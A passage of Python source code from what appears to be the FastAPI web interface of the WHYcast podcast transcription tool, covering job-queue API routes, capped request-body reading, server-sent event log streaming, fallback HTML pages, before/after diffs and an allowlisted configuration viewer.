    the server into a cheap-looking expensive job.
    """
    return [
        {
            "type": name,
            "label": spec["label"],
            "description": spec["description"],
            "gpu": bool(spec["gpu"]),
            "cost": bool(spec["cost"]),
            "requires_base_name": bool(spec.get("requires_base_name", False)),
        }
        for name, spec in jobs.JOB_TYPES.items()
    ]


#: The job types the episode detail page offers, cheapest first. Ordered on
#: purpose: ``postprocess`` re-runs the OpenAI steps from the transcript already
#: on disk, ``speakers`` does the same for speaker assignment, and
#: ``force_episode`` throws the artifacts away and pays for transcription, GPU
#: time and every OpenAI step again. Listing the expensive one last is the
#: cheapest safety measure available.
# Cheapest and least destructive first, so the expensive full re-run is the
# last thing the eye lands on rather than the first.
EPISODE_ACTION_TYPES = ("postprocess", "speakers", "retranscribe", "force_episode")


def _episode_actions() -> List[Dict[str, Any]]:
    """The enqueue actions the episode page offers, in :data:`EPISODE_ACTION_TYPES` order."""
    catalogue = {spec["type"]: spec for spec in job_types_payload()}
    return [catalogue[name] for name in EPISODE_ACTION_TYPES if name in catalogue]


def _step_actions() -> List[Dict[str, Any]]:
    """The single-step re-runs, in the order the pipeline runs them.

    Kept apart from :func:`_episode_actions` because they answer a different
    question. The actions above are "redo this episode"; these are "redo this
    one step, the rest was fine" - which is what you want after editing one
    prompt, and what saves paying for the four calls that were already right.
    """
    # Imported here, not at module scope: webui.runner pulls in the pipeline,
    # and this module must stay importable without loading torch.
    from webui.runner import STEP_JOB_TYPES

    catalogue = {spec["type"]: spec for spec in job_types_payload()}
    return [catalogue[name] for name in STEP_JOB_TYPES if name in catalogue]


def _queue_or_503(request: Request) -> sqlite3.Connection:
    """The index connection, after confirming the queue tables exist.

    ``ensure_job_schema`` runs at startup and only logs on failure, so this is
    what turns "the queue could not be created" into an honest 503 on the job
    routes instead of a raw ``sqlite3.OperationalError`` 500.
    """
    conn = _conn(request)
    try:
        # Under the lock like every other use of this connection: without it
        # this probe - which runs on every job route - could land inside the
        # transaction ``db.rescan`` holds for the length of a directory walk.
        with _DB_LOCK:
            conn.execute("SELECT 1 FROM jobs LIMIT 1").fetchone()
    except sqlite3.Error as exc:
        logger.error("Job queue is not usable: %s", exc)
        raise HTTPException(
            status_code=503, detail="The job queue is not available"
        ) from None
    return conn


def _declared_length(request: Request) -> Optional[int]:
    """``Content-Length`` as an int, or None when absent or unparseable."""
    raw = request.headers.get("content-length")
    if not raw:
        return None
    try:
        return int(raw)
    except ValueError:
        return None


def _is_form_request(request: Request) -> bool:
    """True for ``application/x-www-form-urlencoded``, whatever the parameters."""
    content_type = (request.headers.get("content-type") or "").split(";")[0]
    return content_type.strip().lower() == "application/x-www-form-urlencoded"


async def _read_capped_body(request: Request, cap: int, detail: str) -> bytes:
    """Read the whole request body, refusing anything over ``cap`` as it arrives.

    Args:
        request: The incoming request.
        cap: Maximum body size in bytes.
        detail: The 413 message for this route - the wording differs per editor
            and is part of each one's contract, so it is passed in rather than
            composed here.

    Returns:
        The body bytes, guaranteed to be ``cap`` or fewer.

    Raises:
        HTTPException: 413, as soon as the running total passes ``cap``, so an
            enormous upload is refused mid-stream rather than after it has all
            been buffered.

    Every route that reads a body goes through this, form bodies included, and
    that is the whole point of it existing. The caps used to be enforced in two
    places that between them missed a case: a ``Content-Length`` header check
    (which a chunked body simply does not have) and a ``len(body) > cap`` check
    after ``await request.body()``, commented as "the check that always holds".
    It did not hold: the form branch returned from ``await request.form()``
    *before* reaching it, and ``request.form()`` reads the stream with no limit
    at all. A chunked, form-encoded body therefore bypassed every cap. Measured:
    an 8 MiB prompt written past a 512 KiB cap - and then sent verbatim to the
    paid OpenAI API, once per chunk in the recursive summarisation path, since
    :func:`whycast.pipeline.llm.process_with_openai` truncates the transcript
    against MAX_INPUT_TOKENS but never the prompt - and an 8 MiB ``params``
    string past a 64 KiB cap, growing the SQLite file the episode index shares
    from 189 KB to 16 MB. Not a security hole (cross-origin is refused, and no
    plain HTML form can send chunked), but exactly the regression
    ``_refuse_oversized_body`` was written to fix, re-entering by another door.
    """
    declared = _declared_length(request)
    if declared is not None and declared > cap:
        # Cheap pre-check: refuse before a byte of it is read.
        raise HTTPException(status_code=413, detail=detail)

    chunks: List[bytes] = []
    size = 0
    async for chunk in request.stream():
        size += len(chunk)
        if size > cap:
            raise HTTPException(status_code=413, detail=detail)
        chunks.append(chunk)
    return b"".join(chunks)


def _form_fields(body: bytes) -> Dict[str, str]:
    """Parse an ``application/x-www-form-urlencoded`` body into ``{key: value}``.

    Parsed here rather than by ``await request.form()`` because that reads the
    stream itself, with no size limit, and the body has already been read (and
    capped) by :func:`_read_capped_body` before this is called.

    ``keep_blank_values=True`` matters: an empty speaker-name field means "leave
    this one as it is", and dropping it would make that unreachable from a
    browser form while it kept working over JSON. Last-wins on a repeated key
    matches what Starlette's ``FormData.items()`` did.

    Raises:
        HTTPException: 400 when the body is not UTF-8.
    """
    try:
        text = body.decode("utf-8")
    except UnicodeDecodeError:
        raise HTTPException(
            status_code=400, detail="The form body is not valid UTF-8."
        ) from None
    return {
        key: value
        for key, value in urllib.parse.parse_qsl(
            text, keep_blank_values=True, encoding="utf-8"
        )
    }


async def _job_request_payload(request: Request) -> Dict[str, Any]:
    """Read ``{type, params?, base_name?}`` from a JSON or form-encoded body.

    Both are accepted so the UI can use whichever fits: htmx posts JSON, and a
    plain ``<form method="post">`` (which works with scripting off) posts
    ``application/x-www-form-urlencoded``. In the form case ``params`` arrives
    as a string and is parsed as JSON, because a form field cannot carry a
    nested object.

    Raises:
        HTTPException: 400 when the body is not an object this route can read,
            413 when it is larger than :data:`MAX_JOB_BODY_BYTES`.
    """
    body = await _read_capped_body(request, MAX_JOB_BODY_BYTES, _JOB_BODY_TOO_LARGE)
    if _is_form_request(request):
        payload: Dict[str, Any] = dict(_form_fields(body))
        raw_params = payload.get("params")
        if isinstance(raw_params, str) and raw_params.strip():
            try:
                payload["params"] = json.loads(raw_params)
            except ValueError:
                raise HTTPException(
                    status_code=400, detail="params must be a JSON object"
                ) from None
        else:
            payload.pop("params", None)
        return payload

    if not body.strip():
        return {}
    try:
        payload = json.loads(body)
    except ValueError:
        raise HTTPException(
            status_code=400,
            detail='Body must be JSON: {"type": "...", "params": {}, "base_name": "..."}',
        ) from None
    if not isinstance(payload, dict):
        raise HTTPException(
            status_code=400, detail="Body must be a JSON object, not a list or scalar"
        )
    return payload


def _validated_job_request(
    conn: sqlite3.Connection, payload: Dict[str, Any]
) -> Tuple[str, Dict[str, Any], Optional[str]]:
    """Check a job request and return ``(job_type, params, base_name)``.

    Everything a request can say is validated here, so :func:`webui.jobs.enqueue`
    is only ever reached with values it accepts and a bad request is a 400
    rather than a 500 from deeper down.

    ``base_name`` is checked against the *index*, not against the filesystem.
    That is the whole guarantee: a name the index does not know never reaches
    the queue, so the runner's later lookup cannot be steered at a path the
    scanner never produced.

    What is returned is the index's own spelling of the name, not the caller's.
    Index lookups are case-insensitive, so ``EPISODE_1`` was accepted, stored
    verbatim, and ran correctly - but the episode page filters its job history
    with an exact string compare, so that job was invisible on the page for the
    episode it belonged to. Storing the canonical key costs one assignment and
    removes the whole class.
    """
    job_type = payload.get("type")
    if not isinstance(job_type, str) or not job_type.strip():
        raise HTTPException(
            status_code=400,
            detail=(
                'A job type is required: {"type": "..."}. Known types: '
                + ", ".join(sorted(jobs.JOB_TYPES))
            ),
        )
    job_type = job_type.strip()
    spec = jobs.JOB_TYPES.get(job_type)
    if spec is None:
        raise HTTPException(
            status_code=400,
            detail=(
                f"Unknown job type {job_type!r}. Known types: "
                + ", ".join(sorted(jobs.JOB_TYPES))
            ),
        )

    params = payload.get("params")
    if params is None:
        params = {}
    if not isinstance(params, dict):
        raise HTTPException(status_code=400, detail="params must be a JSON object")
    if any(not isinstance(key, str) for key in params):
        raise HTTPException(status_code=400, detail="params keys must be strings")

    base_name = payload.get("base_name")
    if base_name is not None and not isinstance(base_name, str):
        raise HTTPException(status_code=400, detail="base_name must be a string")
    base_name = (base_name or "").strip() or None

    if base_name is not None:
        episode = db.get_episode(conn, base_name)
        if episode is None:
            # 400, not 404: the request is wrong, not the URL. Same message
            # whether the episode is unknown or the name is a path attempt -
            # there is nothing here worth distinguishing for a caller.
            raise HTTPException(
                status_code=400,
                detail=f"Unknown episode {base_name!r}; it is not in the index",
            )
        base_name = episode["base_name"]
    elif spec.get("requires_base_name"):
        raise HTTPException(
            status_code=400,
            detail=f"Job type {job_type!r} needs a base_name naming the episode",
        )
    return job_type, params, base_name


def _validated_status(status: Optional[str]) -> Optional[str]:
    """A status filter from the query string, or None. Unknown values are 400."""
    if status is None:
        return None
    cleaned = status.strip()
    if not cleaned:
        return None
    if cleaned not in jobs.STATUSES:
        raise HTTPException(
            status_code=400,
            detail=f"Unknown status {cleaned!r}. Known: " + ", ".join(jobs.STATUSES),
        )
    return cleaned


def _episode_jobs(conn: sqlite3.Connection, base_name: str) -> List[Dict[str, Any]]:
    """Recent jobs that targeted ``base_name``, newest first.

    A bounded window (:data:`EPISODE_JOB_HISTORY`) filtered in Python; see that
    constant for why this is not a query.
    """
    return [
        job
        for job in jobs.list_jobs(conn, limit=EPISODE_JOB_HISTORY)
        if job.get("base_name") == base_name
    ]


# ---------------------------------------------------------------------------
# Server-sent events: tailing a job's events.jsonl
#
# The contract with :class:`webui.runner.JsonlEventSink` is the file format and
# nothing else. The runner appends one flushed JSON object per line, each with a
# monotonic ``seq``; this reads from a byte offset, hands out complete lines
# only, and uses ``seq`` as the SSE event id. That is what makes reconnect work:
# a browser sends ``Last-Event-ID: 42`` and gets 43 onwards, not the whole log.
#
# Nothing in here may block the event loop. The file read and every queue lookup
# go through ``anyio.to_thread.run_sync``: ``webui.db`` serialises on a module
# lock that ``rescan`` holds for the length of a directory walk, so a rescan
# during an open stream would otherwise stall every request in the process.
# ---------------------------------------------------------------------------


def _read_new_lines(path: str, offset: int) -> Tuple[int, List[str]]:
    """Read whole lines appended to ``path`` after ``offset``.

    Returns the new offset and the complete lines found. A trailing partial
    line is *not* consumed and the offset does not move past it: the writer
    flushes per line, but a reader can still catch a line mid-write, and half a
    JSON object parsed as an event would be a silently dropped message.

    A missing file is not an error - a queued job has no log yet - and neither
    is an unreadable one; both simply produce nothing this tick.
    """
    try:
        with open(path, "rb") as handle:
            handle.seek(offset)
            chunk = handle.read()
    except FileNotFoundError:
        return offset, []
    except OSError as exc:  # pragma: no cover - defensive
        logger.debug("Could not read %s: %s", path, exc)
        return offset, []

    if not chunk:
        return offset, []
    end = chunk.rfind(b"\n")
    if end == -1:
        return offset, []
    consumed = chunk[: end + 1]
    # errors="replace": a legacy or truncated byte must not end the stream.
    text = consumed.decode("utf-8", errors="replace")
    return offset + len(consumed), text.splitlines()


def _sse_frame(event: str, payload: Any, event_id: Optional[int] = None) -> str:
    """One SSE frame. ``event_id`` becomes the browser's ``Last-Event-ID``."""
    lines: List[str] = []
    if event_id is not None:
        lines.append(f"id: {event_id}")
    lines.append(f"event: {event}")
    body = json.dumps(payload, ensure_ascii=False, default=str)
    # json.dumps escapes newlines inside strings, so this is normally one line.
    # Splitting anyway keeps the framing correct rather than depending on it.
    for part in body.split("\n"):
        lines.append(f"data: {part}")
    return "\n".join(lines) + "\n\n"


def _last_event_id(request: Request) -> int:
    """The sequence number a reconnecting client already has, or 0.

    ``Last-Event-ID`` is what a browser's ``EventSource`` resends by itself.
    The query parameter is the manual equivalent, for a client (or a test) that
    is not a browser. Anything unparsable means "start from the beginning",
    which replays rather than skips - the safe direction to be wrong in.
    """
    raw = request.headers.get("last-event-id")
    if raw is None:
        raw = request.query_params.get("last_event_id")
    if raw is None:
        return 0
    try:
        return max(int(str(raw).strip()), 0)
    except (TypeError, ValueError):
        return 0


async def _job_event_stream(
    request: Request, conn: sqlite3.Connection, job_id: str, after_seq: int
) -> AsyncIterator[str]:
    """Yield SSE frames for one job until it reaches a terminal status.

    Shape of the stream:

    * ``retry`` plus a ``status`` frame with the current job row, so a client
      that connects late still knows what it is looking at;
    * a ``progress`` frame per event line, carrying ``seq`` as the event id;
    * a ``status`` frame whenever the job's status changes;
    * ``: heartbeat`` comments during silence;
    * a final ``status`` and an ``end`` frame, then the generator returns.

    That ``end`` frame is not decoration. ``EventSource`` reconnects on any
    clean close, so a finished job without a sentinel would have the browser
    reopening the stream forever; the client script closes the connection when
    it sees ``end``.

    Ordering matters in the terminal case: **drain, then check status, then
    drain again**. The runner writes its last line and exits before the worker
    marks the job finished, so checking status first would usually work and
    would occasionally eat the last event - the worst kind of bug to own.
    """
    offset = 0
    last_seq = after_seq
    last_status: Optional[str] = None
    last_write = time.monotonic()

    def frames_from(lines: List[str]) -> List[str]:
        nonlocal last_seq
        out: List[str] = []
        for line in lines:
            line = line.strip()
            if not line:
                continue
            try:
                record = json.loads(line)
            except ValueError:
                logger.debug("Skipping malformed event line in job %s", job_id)
                continue
            if not isinstance(record, dict):
                continue
            seq = record.get("seq")
            if not isinstance(seq, int) or isinstance(seq, bool):
                continue
            # The resume filter. Everything the client already has is dropped
            # here rather than never being read: the file has no index, so
            # reaching seq N means walking the lines before it.
            if seq <= last_seq:
                continue
            last_seq = seq
            out.append(_sse_frame("progress", record, event_id=seq))
        return out

    try:
        path = jobs.events_path(job_id)
    except ValueError:  # pragma: no cover - job_id already validated by lookup
        yield _sse_frame("error", {"detail": "Invalid job id"})
        return

    yield f"retry: {int(SSE_POLL_SECONDS * 8000)}\n\n"

    while True:
        try:
            if await request.is_disconnected():
                return
        except Exception:  # pragma: no cover - transport dependent
            pass

        offset, lines = await anyio.to_thread.run_sync(_read_new_lines, path, offset)
        for frame in frames_from(lines):
            yield frame
            last_write = time.monotonic()

        try:
            job = await anyio.to_thread.run_sync(jobs.get_job, conn, job_id)
        except sqlite3.Error as exc:
            # Almost always the shared connection being closed under us during
            # shutdown. End the stream and say so; the client reconnects to the
            # next process rather than hanging on a dead one.
            logger.info("Ending the event stream for job %s: %s", job_id, exc)
            yield _sse_frame("error", {"detail": "The job queue closed"})
            return
        if job is None:
            # A job row is never deleted by this app; if it is gone, something
            # outside removed it and there is nothing left to follow.
            yield _sse_frame("end", {"job_id": job_id, "status": None, "last_seq": last_seq})
            return

        if job["status"] != last_status:
            last_status = job["status"]
            yield _sse_frame("status", job)
            last_write = time.monotonic()

        if job["is_terminal"]:
            offset, lines = await anyio.to_thread.run_sync(
                _read_new_lines, path, offset
            )
            for frame in frames_from(lines):
                yield frame
            yield _sse_frame(
                "end",
                {
                    "job_id": job_id,
                    "status": job["status"],
                    "exit_code": job["exit_code"],
                    "error": job["error"],
                    "last_seq": last_seq,
                },
            )
            return

        if time.monotonic() - last_write >= SSE_HEARTBEAT_SECONDS:
            # A comment: valid SSE, ignored by EventSource, enough traffic to
            # keep an idle connection from being reaped.
            yield ": heartbeat\n\n"
            last_write = time.monotonic()

        await anyio.sleep(SSE_POLL_SECONDS)


# ---------------------------------------------------------------------------
# Fallback pages
#
# The job templates are written separately from these routes. Rather than let
# a missing file become a 500 - on the page an operator opens to find out why
# their job died, which would be a poor joke - each HTML job route renders its
# template if it is there and a plain built-in page if it is not.
#
# The fallbacks are deliberately dull, but they are complete: they link the
# same /static/app.css and /static/app.js, so the live log works on the job
# detail page either way. No inline script, so the app's CSP still holds.
# ---------------------------------------------------------------------------


def _fallback_page(title: str, body: str) -> HTMLResponse:
    """A minimal standalone page, used when a template is not installed."""
    return HTMLResponse(
        "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\">"
        "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
        f"<title>{_escape(title)}</title>"
        "<link rel=\"stylesheet\" href=\"/static/app.css\">"
        "<script src=\"/static/app.js\" defer></script></head><body>"
        "<header class=\"topbar\"><a class=\"brand\" href=\"/\">WHYcast</a>"
        "<nav class=\"nav\"><a href=\"/\">Episodes</a>"
        "<a href=\"/jobs\">Jobs</a></nav></header>"
        f"<main class=\"page\">{body}</main></body></html>"
    )


def _job_row_html(job: Dict[str, Any]) -> str:
    """One job as a table row for the fallback dashboard."""
    flags = " ".join(
        label
        for flag, label in ((job.get("gpu"), "GPU"), (job.get("cost"), "COSTS MONEY"))
        if flag
    )
    return (
        "<tr>"
        f"<td><a href=\"/jobs/{_escape(job['id'])}\">{_escape(job['id'][:8])}</a></td>"
        f"<td>{_escape(str(job.get('label') or job['type']))}</td>"
        f"<td>{_escape(str(job.get('base_name') or '-'))}</td>"
        f"<td>{_escape(job['status'])}</td>"
        f"<td>{_escape(flags or '-')}</td>"
        f"<td>{_escape(str(job.get('created_at_iso') or '-'))}</td>"
        f"<td>{_escape(str(job.get('error') or ''))}</td>"
        "</tr>"
    )


def _jobs_fallback(
    queue: List[Dict[str, Any]], active: Optional[Dict[str, Any]]
) -> HTMLResponse:
    """The built-in queue dashboard."""
    if active is None:
        holder = "<p>No job is running. The GPU is free.</p>"
    else:
        holder = (
            f"<p>Running: <a href=\"/jobs/{_escape(active['id'])}\">"
            f"{_escape(str(active.get('label') or active['type']))}</a>"
            + (f" for {_escape(str(active['base_name']))}" if active.get("base_name") else "")
            + (" - holds the GPU" if active.get("gpu") else " - no GPU")
            + "</p>"
        )
    rows = "".join(_job_row_html(job) for job in queue) or (
        "<tr><td colspan=\"7\">No jobs yet.</td></tr>"
    )
    return _fallback_page(
        "Jobs - WHYcast",
        "<h1>Jobs</h1>" + holder + "<table><thead><tr>"
        "<th>Id</th><th>Type</th><th>Episode</th><th>Status</th>"
        "<th>Flags</th><th>Created</th><th>Error</th>"
        f"</tr></thead><tbody>{rows}</tbody></table>",
    )


def _job_detail_fallback(job: Dict[str, Any]) -> HTMLResponse:
    """The built-in job detail page, including the live-log container.

    The container carries the same hooks ``/static/app.js`` reads on the real
    template - ``.joblog[data-job-id]``, ``data-events-url``, ``data-terminal``,
    ``[data-job-log]``, ``[data-job-status-badge]`` - so the live log works
    here too rather than only on the styled page.
    """
    warning = (
        "<p><strong>This job type makes paid OpenAI calls.</strong></p>"
        if job.get("cost")
        else ""
    )
    terminal = "true" if job.get("is_terminal") else "false"
    return _fallback_page(
        f"Job {job['id'][:8]} - WHYcast",
        f"<h1>{_escape(str(job.get('label') or job['type']))}</h1>"
        + warning
        + "<dl>"
        + f"<dt>Id</dt><dd>{_escape(job['id'])}</dd>"
        + f"<dt>Status</dt><dd data-job-status-badge>{_escape(job['status'])}</dd>"
        + f"<dt>Episode</dt><dd>{_escape(str(job.get('base_name') or '-'))}</dd>"
        + f"<dt>Created</dt><dd>{_escape(str(job.get('created_at_iso') or '-'))}</dd>"
        + f"<dt>Error</dt><dd>{_escape(str(job.get('error') or '-'))}</dd>"
        + "</dl>"
        + f"<div class=\"joblog\" data-job-id=\"{_escape(job['id'])}\""
        + f" data-events-url=\"/api/jobs/{_escape(job['id'])}/events\""
        + f" data-terminal=\"{terminal}\">"
        + "<p id=\"joblog-nojs\">The live log needs JavaScript. The same events "
        + "are on disk in the job's <code>events.jsonl</code>.</p>"
        + "<ol class=\"joblog-lines\" data-job-log></ol></div>"
        + "<p><a href=\"/jobs\">Back to the job list</a></p>",
    )


def _render_or_fallback(
    templates: Jinja2Templates,
    request: Request,
    name: str,
    context: Dict[str, Any],
    fallback,
) -> Response:
    """Render ``name``, or the built-in page if that template is not installed."""
    try:
        return templates.TemplateResponse(request, name, context)
    except TemplateNotFound:
        logger.info("Template %s is not installed; using the built-in page", name)
        return fallback()


def _register_job_routes(app: FastAPI, templates: Jinja2Templates) -> None:
    """Queue API, SSE stream, and the two job pages."""

    # -- JSON API -----------------------------------------------------------

    @app.get("/api/job-types", name="api_job_types")
    async def api_job_types():
        """The job catalogue, with the ``gpu`` and ``cost`` flags.

        Read-only and free: it is the list a UI needs before it can offer a
        button, and it is where the "this spends money" warning comes from.
        """
        return {"job_types": job_types_payload()}

    @app.post("/api/jobs", status_code=201, name="api_jobs_create")
    async def api_jobs_create(request: Request):
        """Enqueue a job. Nothing starts here; the worker claims it.

        The body must name the type explicitly - there is no route that starts
        a paid job without one (ADR-008 cost safety). The response carries the
        created row, including ``cost``, so the caller can show what it just
        committed to.
        """
        conn = _queue_or_503(request)
        payload = await _job_request_payload(request)
        job_type, params, base_name = _validated_job_request(conn, payload)
        try:
            job = jobs.enqueue(conn, job_type, params=params, base_name=base_name)
        except ValueError as exc:
            # Anything the validation above did not already catch is still the
            # caller's mistake, not a server fault.
            raise HTTPException(status_code=400, detail=str(exc)) from None
        except (WhycastError, sqlite3.Error) as exc:
            logger.error("Could not enqueue %s: %s", job_type, exc)
            raise HTTPException(
                status_code=503, detail="The job queue is not available"
            ) from None
        logger.info(
            "Queued job %s (%s%s)",
            job["id"],
            job_type,
            f" for {base_name}" if base_name else "",
        )
        return job

    @app.get("/api/jobs", name="api_jobs")
    async def api_jobs(
        request: Request,
        status: Optional[str] = Query(None),
        limit: int = Query(JOB_LIST_LIMIT, ge=1, le=MAX_JOB_LIST_LIMIT),
    ):
        """Jobs newest first, optionally filtered by status."""
        conn = _queue_or_503(request)
        wanted = _validated_status(status)
        rows = jobs.list_jobs(conn, status=wanted, limit=limit)
        return {
            "count": len(rows),
            "status": wanted,
            "limit": limit,
            "active": jobs.active_job(conn),
            "jobs": rows,
        }

    @app.get("/api/jobs/{job_id}", name="api_job")
    async def api_job(request: Request, job_id: str):
        """One job."""
        return _get_job_or_404(request, job_id)

    @app.post("/api/jobs/{job_id}/cancel", name="api_job_cancel")
    async def api_job_cancel(request: Request, job_id: str):
        """Ask a job to stop.

        A queued job is cancelled outright. A running one gets the
        ``cancel_requested`` flag, which the runner polls and the worker acts
        on by killing the child's whole process tree; the status only becomes
        ``cancelled`` once the process has actually stopped. The returned row
        says which of the two happened.
        """
        conn = _queue_or_503(request)
        try:
            job = jobs.request_cancel(conn, job_id)
        except ValueError:
            raise HTTPException(status_code=404, detail="Job not found") from None
        except (WhycastError, sqlite3.Error) as exc:
            logger.error("Could not cancel job %s: %s", job_id, exc)
            raise HTTPException(
                status_code=503, detail="The job queue is not available"
            ) from None
        return job

    @app.get("/api/jobs/{job_id}/events", name="api_job_events")
    async def api_job_events(request: Request, job_id: str):
        """Live progress for one job, as ``text/event-stream``.

        Reconnect with ``Last-Event-ID`` (the header a browser sends by itself,
        or a ``last_event_id`` query parameter) to resume after that sequence
        number instead of replaying the log. The stream ends by itself when the
        job reaches a terminal status; see :func:`_job_event_stream`.
        """
        conn = _queue_or_503(request)
        # Confirm the job exists before opening a long-lived response: a 404
        # inside a stream is a 200 with an error frame, which is worse.
        _get_job_or_404(request, job_id)
        return StreamingResponse(
            _job_event_stream(request, conn, job_id, _last_event_id(request)),
            media_type="text/event-stream",
            headers=dict(_SSE_HEADERS),
        )

    # -- HTML pages ---------------------------------------------------------

    @app.get("/jobs", response_class=HTMLResponse, name="jobs_dashboard")
    async def jobs_dashboard(
        request: Request, status: Optional[str] = Query(None)
    ):
        """Queue, history, and which job is holding the GPU."""
        conn = _queue_or_503(request)
        wanted = _validated_status(status)
        queue = jobs.list_jobs(conn, status=wanted, limit=MAX_JOB_LIST_LIMIT)
        active = jobs.active_job(conn)
        return _render_or_fallback(
            templates,
            request,
            "jobs.html",
            {
                "jobs": queue,
                "active": active,
                "status": wanted,
                "statuses": jobs.STATUSES,
                "job_types": job_types_payload(),
                "meta": _public_meta(db.get_meta(conn)),
            },
            lambda: _jobs_fallback(queue, active),
        )

    @app.get("/jobs/{job_id}", response_class=HTMLResponse, name="job_detail")
    async def job_detail(request: Request, job_id: str):
        """One job, with the live log fed by ``/api/jobs/{job_id}/events``."""
        conn = _queue_or_503(request)
        job = _get_job_or_404(request, job_id)
        return _render_or_fallback(
            templates,
            request,
            "job_detail.html",
            {
                "job": job,
                "events_url": f"/api/jobs/{job['id']}/events",
                "job_types": job_types_payload(),
                "meta": _public_meta(db.get_meta(conn)),
            },
            lambda: _job_detail_fallback(job),
        )

    @app.get("/api/config", name="api_config")
    async def api_config(request: Request):
        """Allowlisted configuration only; secrets are never read (ADR-008)."""
        return JSONResponse(_config_payload())

    @app.get("/config", response_class=HTMLResponse, name="config_viewer")
    async def config_viewer(request: Request):
        """The same, rendered."""
        conn = _queue_or_503(request)
        payload = _config_payload()
        return _render_or_fallback(
            templates,
            request,
            "config.html",
            {"config": payload, "meta": _public_meta(db.get_meta(conn))},
            lambda: JSONResponse(payload),
        )

    @app.get("/api/jobs/{job_id}/diff", name="api_job_diff")
    async def api_job_diff(request: Request, job_id: str):
        """What this run changed, against the copies taken before it started.

        The comparison is the job's own before-snapshot (``webui.snapshots``)
        versus what is on disk now - not a ``.bak``, which ADR-009 removed. A
        job with no snapshot answers honestly rather than pretending nothing
        changed.
        """
        job = _get_job_or_404(request, job_id)
        return JSONResponse(_job_diff_payload(job))

    @app.get("/jobs/{job_id}/diff", response_class=HTMLResponse, name="job_diff")
    async def job_diff(request: Request, job_id: str):
        """The same comparison, rendered."""
        conn = _queue_or_503(request)
        job = _get_job_or_404(request, job_id)
        payload = _job_diff_payload(job)
        return _render_or_fallback(
            templates,
            request,
            "job_diff.html",
            {
                "job": job,
                "diff": payload,
                "job_types": job_types_payload(),
                "meta": _public_meta(db.get_meta(conn)),
            },
            lambda: _job_detail_fallback(job),
        )


#: How many diff lines are returned per artifact. A regenerated transcript can
#: differ in thousands of lines; past a point the answer is "it was rewritten",
#: and shipping the rest helps nobody and costs the browser dearly.
_MAX_DIFF_LINES = 400


def _job_diff_payload(job: Dict[str, Any]) -> Dict[str, Any]:
    """Compare a job's before-snapshot with the artifacts on disk now."""
    manifest = snapshots.load_manifest(job["id"])
    if not manifest:
        return {
            "job_id": job["id"],
            "base_name": job.get("base_name"),
            "available": False,
            "reason": (
                "No before-snapshot was recorded for this job, so there is "
                "nothing to compare against. Snapshots are taken for jobs that "
                "target one episode, from the moment the job starts."
            ),
            "artifacts": [],
        }

    entries = []
    for entry in manifest.get("artifacts", []):
        filename = os.path.basename(str(entry.get("filename") or ""))
        if not filename:
            continue
        current_path = _safe_file(podcast_dir_from_env(), entry.get("source"))
        # The previous version now lives in the backup tree the job moved it to
        # (ADR-011); older manifests, written when the copy sat in the job's own
        # directory, still resolve through snapshot_file.
        before_path = entry.get("backup") or snapshots.snapshot_file(job["id"], filename)
        entries.append(
            _diff_entry(entry, filename, before_path, current_path)
        )

    changed = sum(1 for e in entries if e["status"] == "changed")
    return {
        "job_id": job["id"],
        "base_name": manifest.get("base_name") or job.get("base_name"),
        "available": True,
        "changed_count": changed,
        "artifacts": entries,
    }


def _diff_entry(
    entry: Dict[str, Any],
    filename: str,
    before_path: str,
    current_path: Optional[str],
) -> Dict[str, Any]:
    """One artifact's before/after comparison, safe on anything unreadable."""
    result: Dict[str, Any] = {
        "kind": entry.get("kind"),
        "fmt": entry.get("fmt"),
        "filename": filename,
        "status": "unknown",
        "lines": [],
        "truncated": False,
    }
    if not entry.get("copied"):
        result["status"] = "not-recorded"
        result["reason"] = entry.get("reason") or "not copied before the run"
        return result

    before = _read_text_or_none(before_path)
    after = _read_text_or_none(current_path) if current_path else None
    if before is None:
        result["status"] = "not-recorded"
        result["reason"] = "the recorded copy is unreadable"
        return result
    if after is None:
        result["status"] = "removed"
        return result
    if before == after:
        result["status"] = "unchanged"
        return result

    diff = list(
        difflib.unified_diff(
            before.splitlines(),
            after.splitlines(),
            fromfile=f"{filename} (before)",
            tofile=f"{filename} (now)",
            lineterm="",
            n=2,
        )
    )
    result["status"] = "changed"
    result["truncated"] = len(diff) > _MAX_DIFF_LINES
    result["lines"] = diff[:_MAX_DIFF_LINES]
    return result


#: Configuration values the UI may show. An ALLOWLIST, never a denylist
#: (ADR-008 Decision Contract): a denylist fails open, so the day someone adds
#: WHYCAST_SOME_NEW_TOKEN to config.py it would be published until a person
#: noticed. Everything absent from this tuple is simply never read.
#:
#: Secrets are not here, and they are not here in masked form either. "sk-...
#: (51 chars)" still leaks the length and the prefix, and it invites the next
#: person to relax it by one more character.
_VISIBLE_CONFIG_KEYS = (
    "VERSION",
    "MODEL_SIZE",
    "DEVICE",
    "COMPUTE_TYPE",
    "BEAM_SIZE",
    "OPENAI_MODEL",
    "OPENAI_LARGE_CONTEXT_MODEL",
    "OPENAI_HISTORY_MODEL",
    "OPENAI_SPEAKER_MODEL",
    "TEMPERATURE",
    "MAX_TOKENS",
    "MAX_INPUT_TOKENS",
    "CHARS_PER_TOKEN",
    "MAX_FILE_SIZE_KB",
    "USE_RECURSIVE_SUMMARIZATION",
    "MAX_CHUNK_SIZE",
    "CHUNK_OVERLAP",
    "USE_SPEAKER_DIARIZATION",
    "DIARIZATION_MODEL",
    "DIARIZATION_ALTERNATIVE_MODEL",
    "DIARIZATION_MIN_SPEAKERS",
    "DIARIZATION_MAX_SPEAKERS",
    "USE_CUSTOM_VOCABULARY",
)

#: Config values that are filesystem paths. Shown as the basename plus whether
#: the file exists: the full path of a prompt file is not a secret, but it is
#: noise, and a reader only wants to know which file and whether it is there.
_VISIBLE_CONFIG_PATHS = (
    "PROMPT_CLEANUP_FILE",
    "PROMPT_SUMMARY_FILE",
    "PROMPT_BLOG_FILE",
    "PROMPT_BLOG_ALT1_FILE",
    "PROMPT_HISTORY_EXTRACT_FILE",
    "PROMPT_SPEAKER_ASSIGN_FILE",
    "VOCABULARY_FILE",
)


def _config_payload() -> Dict[str, Any]:
    """The configuration this UI is willing to show.

    Reads only the names in the allowlists above, straight from
    :mod:`whycast.config` (ADR-007: env-vars are the source). No environment
    dictionary is ever iterated, so a new secret cannot arrive here by accident.
    """
    from whycast import config as whycast_config

    settings = []
    for key in _VISIBLE_CONFIG_KEYS:
        if not hasattr(whycast_config, key):
            continue
        settings.append({"key": key, "value": getattr(whycast_config, key)})

    paths = []
    for key in _VISIBLE_CONFIG_PATHS:
        raw = getattr(whycast_config, key, None)
        if not raw:
            continue
